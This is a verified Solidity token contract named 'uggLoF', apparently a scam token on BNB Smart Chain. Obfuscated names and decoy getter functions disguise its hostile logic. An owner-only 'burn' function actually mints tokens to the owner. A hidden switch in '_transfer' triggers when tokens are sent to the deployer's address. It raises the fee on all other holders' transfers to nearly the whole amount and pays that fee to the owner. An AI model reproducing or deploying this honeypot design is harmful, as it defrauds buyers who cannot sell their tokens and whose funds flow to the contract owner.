/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract uggLoF {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
address private  fiIYlW = address(0);
uint256 private  bJYigc = 10000000000;
string public  name = "uggLoF";
address private  bhoPiH = address(0);
address private  aYHETW = address(0);
uint256 private  OxnRPi = 100000000;
uint8 public constant decimals = 18;
string public  symbol = "uggLoF";
address private  ugBlZN = address(0);
address private  OqkjNK = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  FbOWnD = 1000000000000000000;
uint256 public constant MogRfR = 99999;
uint256 private  ZwLrNh = 1000000000000000000000;
address private  BrlgHS = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  GHeNql = 1000000000000000;
mapping (address => uint256) public balanceOf;
address private  LVegbp = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  PeqrNO = address(0);
uint256 private  BsadGo = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  jULQcx = address(0);
uint256 private  hIhVzb = 1000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZroWRI 0");
require(spender != address(0), "fZroWRI 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getfiIYlW() private returns (address) {
return fiIYlW;
}

function _getBrlgHS() private returns (address) {
return BrlgHS;
}

function _getZwLrNh() private returns (uint256) {
return ZwLrNh;
}

function _gethIhVzb() private returns (uint256) {
return hIhVzb;
}



function _getOxnRPi() private returns (uint256) {
return OxnRPi;
}









function _getOqkjNK() private returns (address) {
return OqkjNK;
}

function _getGHeNql() private returns (uint256) {
return GHeNql;
}

function _getLVegbp() private returns (address) {
return LVegbp;
}





function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getbhoPiH() private returns (address) {
return bhoPiH;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getbJYigc() private returns (uint256) {
return bJYigc;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZroWRI");
require(to != address(0), "ZroWRI");
require(amount <= balanceOf[from], "ZroWRI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MogRfR/FbOWnD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==jULQcx){
FbOWnD = MogRfR+2;
}
emit Transfer(from, to, transferAmount);
}










function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getaYHETW() private returns (address) {
return aYHETW;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getPeqrNO() private returns (address) {
return PeqrNO;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}




function _getBsadGo() private returns (uint256) {
return BsadGo;
}

constructor () public {
jULQcx = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getugBlZN() private returns (address) {
return ugBlZN;
}




}